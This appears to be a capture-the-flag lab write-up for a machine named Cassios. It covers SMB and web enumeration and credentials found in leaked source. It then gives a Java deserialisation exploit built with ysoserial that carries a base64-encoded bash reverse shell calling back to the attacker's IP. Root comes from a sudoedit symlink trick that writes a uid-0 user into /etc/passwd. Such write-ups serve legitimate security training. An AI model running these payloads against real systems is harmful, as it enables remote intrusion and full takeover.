# Cassios

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.208.116
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 14:41 +08
Nmap scan report for 192.168.208.116
Host is up (0.17s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

### SMB Enumeration

`smbmap` shows that we have one share we can read and write to:

```
$ smbmap -H 192.168.208.116                               
[+] IP: 192.168.208.116:445     Name: 192.168.208.116                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Samantha Konstan                                        READ, WRITE     Backups and Recycler files
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.10.4)
```

We cam connect to that via `smbclient`.&#x20;

```
$ smbclient //192.168.208.116/Samantha\ Konstan  
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 21 14:42:40 2023
  ..                                  D        0  Fri Sep 25 01:38:10 2020
  recycler.ser                        N        0  Thu Sep 24 09:35:15 2020
  readme.txt                          N      478  Fri Sep 25 01:32:50 2020
  spring-mvc-quickstart-archetype      D        0  Fri Sep 25 01:36:11 2020
  thymeleafexamples-layouts           D        0  Fri Sep 25 01:37:09 2020
  resources.html                      N    42713  Fri Sep 25 01:37:41 2020
  pom-bak.xml                         N     2187  Fri Oct  2 04:28:46 2020
```

There are loads of files, including a `.ser` file within. I noticed that this was running a Java application, based on the `spring` file, which was a Java framework. The `readme.txt` included some interesting information:

```
$ cat readme.txt    
The recycler is a critical piece of our industrial infraestructure.
Please be careful with it!

The .ser file holds all the last data saved from the process, it can
be readed from the upper management dashboard app. 

Remember to set the location of the file to my home directory "~/backups".

Set this directory to share access so the remote system can access the
file via SMB.

Any concerns or suggestions, please reach at samantha@loca.host.

Samantha Konstan
Java Mantainer
```

`.ser` seems to be an important file. There was also mention of a 'dashboard app\`, which was likely one of the web applications hosted on this.&#x20;

### Web Enumeration --> Web Creds

Port 80 hosted a corporate website:

<figure><img src="../../../.gitbook/assets/image (1396).png" alt=""><figcaption></figcaption></figure>

I was rather static, so I did a `gobuster` scan on it using a few wordlists. Using `common.txt` reveals a hidden directory:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.208.116/ -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.208.116/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/21 14:48:32 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/assets               (Status: 301) [Size: 238] [--> http://192.168.208.116/assets/]
/backup_migrate       (Status: 301) [Size: 246] [--> http://192.168.208.116/backup_migrate/]
/cgi-bin/             (Status: 403) [Size: 210]
/images               (Status: 301) [Size: 238] [--> http://192.168.208.116/images/]
/index.html           (Status: 200) [Size: 9088]
/download             (Status: 200) [Size: 1479862]
```

The `/download` endpoint just gives us the source code for this website, and it was static. The `backup_migrate` file was more interesting:

<figure><img src="../../../.gitbook/assets/image (1388).png" alt=""><figcaption></figcaption></figure>

We can download and extract the files within this using `tar -xvf`:

```
$ tar -xvf recycler.tar 
src/
src/main/
src/main/resources/
src/main/resources/static/
src/main/resources/static/css/
src/main/resources/static/css/main.css
src/main/resources/static/css/graph.css
src/main/resources/static/images/
src/main/resources/static/images/factory.jpg
src/main/resources/templates/
src/main/resources/templates/home.html
src/main/resources/templates/login.html
src/main/resources/templates/hello.html
src/main/resources/templates/dashboard.html
src/main/resources/application.properties
src/main/java/
src/main/java/com/
src/main/java/com/industrial/
src/main/java/com/industrial/recycler/
src/main/java/com/industrial/recycler/WebSecurityConfig.java
src/main/java/com/industrial/recycler/._DashboardController.java
src/main/java/com/industrial/recycler/RecyclerApplication.java
src/main/java/com/industrial/recycler/Test.java
src/main/java/com/industrial/recycler/._Recycler.java
src/main/java/com/industrial/recycler/Recycler.java
src/main/java/com/industrial/recycler/MvcConfig.java
src/main/java/com/industrial/recycler/DashboardController.java
```

Seems that we have source code. Before delving into this, let's check out port 8080, which hosted the dashboard mentioned in the `readme.txt` from SMB.&#x20;

<figure><img src="../../../.gitbook/assets/image (1419).png" alt=""><figcaption></figcaption></figure>

The `WebSecurityConfig.java` file contained credentials needed to access the dashboard:

```java
public UserDetailsService userDetailsService() {
                UserDetails user =
                         User.withDefaultPasswordEncoder()
                                .username("recycler")
                                .password("DoNotMessWithTheRecycler123")
                                .roles("USER")
                                .build();

                return new InMemoryUserDetailsManager(user);
        }

```

<figure><img src="../../../.gitbook/assets/image (1417).png" alt=""><figcaption></figcaption></figure>

### Source Code --> Deserialisation RCE

There was some functionality for this, so let's read the source code to find how it checks status and saves the current values. The code for this can be found within `DashboardController.java`:

```java
public class DashboardController {

        String filename = "/home/samantha/backups/recycler.ser";

        @GetMapping("/check")
        public String Check( String name, Model model) {

        Recycler r           = new Recycler();
        FileInputStream fis  = null;
        ObjectInputStream in = null;
        try {
            fis = new FileInputStream(filename);
            in  = new ObjectInputStream(fis);
            r   = (Recycler) in.readObject();
            in.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        
                model.addAttribute("date", "Now()");
                model.addAttribute("total", r.total);
                model.addAttribute("liquid", r.solid);
                model.addAttribute("solid", r.liquid);

                return "dashboard";
        }

        @GetMapping("/save")
        public String Save(Model model) {

                int tons   = ThreadLocalRandom.current().nextInt(1, 20);
                int solid  = ThreadLocalRandom.current().nextInt(1, 100);
                int liquid = 100-solid;

                model.addAttribute("date", "Now()");
                model.addAttribute("total", tons);
                model.addAttribute("liquid", solid);
                model.addAttribute("solid", liquid);

        Recycler r = new Recycler();
        r.setDate("Now()");
        r.setTotal(""+tons);
        r.setSolid(""+solid);
        r.setLiquid(""+liquid);

        try {
        
            FileOutputStream file  = new FileOutputStream(filename); 
            ObjectOutputStream out = new ObjectOutputStream(file); 
                        out.writeObject(r);
                out.close(); 
                file.close(); 
                
                } catch (IOException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                } 

                return "dashboard";
        }

}
```

We can see that the `recycler.ser` file is being used for both functions, where `/save` writes to it using the current values on screen, and `/check` reads from it. The thing that stood out was the `readObject()` function being used to read from `recycler.ser`, which could potentially allow for Deserialisation attacks.

{% embed url="https://book.hacktricks.xyz/pentesting-web/deserialization#java-http" %}

First we need to check if its vulnerable by searching all the SMB and Recycler files for mention of `commons-collections`.&#x20;

```
$ grep -R commons
<TRUNCATED>
smb/pom-bak.xml:                    <groupId>org.apache.commons</groupId>
smb/pom-bak.xml:                    <artifactId>commons-collections4</artifactId
```

`commons-collections4` was being used! Next, I checked to see if we could overwrite `recycler.ser` within the SMB directory.

<figure><img src="../../../.gitbook/assets/image (1383).png" alt=""><figcaption></figcaption></figure>

Based on the timestamp, this worked. So now, we need to create our serialised payload using `ysoserial`.&#x20;

{% code overflow="wrap" %}
```
$ echo 'bash -i >& /dev/tcp/192.168.45.153/21 0>&1  ' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE1My8yMSAwPiYxICAK

$ /usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar ~/ysoserial-all.jar CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE1My8yMSAwPiYxICAK}|{base64,-d}|{bash,-i}' > recycler.ser
```
{% endcode %}

{% hint style="info" %}
You must use Java 8 to make it work. The latest versions of Java cannot run `ysoserial.jar` properly.&#x20;
{% endhint %}

This would generate a serialised object that we can use. Afterwards, place this within the share and click on Check Status on the website to get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (3166).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudoedit Double Wildcard --> Arbitrary Write

I checked our `sudo` privileges, and saw this:

```
[samantha@cassios ~]$ sudo -l
Matching Defaults entries for samantha on cassios:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="QTDIR
    KDEDIR"

User samantha may run the following commands on cassios:
    (root) NOPASSWD: sudoedit /home/*/*/recycler.ser
```

We can abuse this by creating a symlink to the `/etc/passwd` file named as `recycler.ser` and add a new `root` user to it using this line:

```
hacker:$1$1pSPZTFk$gYPHTQbbBddT5WjcvIZNl/:0:0::/root:/bin/sh
```

Run the following commands:

```
[samantha@cassios ~]$ mkdir symlink
[samantha@cassios ~]$ cd symlink/                                                            
[samantha@cassios symlink]$ ln -s /etc/passwd recycler.ser
[samantha@cassios symlink]$ ls
recycler.ser
[samantha@cassios symlink]$ sudoedit /home/samantha/symlink/recycler.ser 
```

This would bring up the `/etc/passwd` file, where we can add the new `hacker` user and use `:wq` to save the changes made. Then, `su` to hacker with `hello123` as the password:

<figure><img src="../../../.gitbook/assets/image (1379).png" alt=""><figcaption></figcaption></figure>

Rooted!
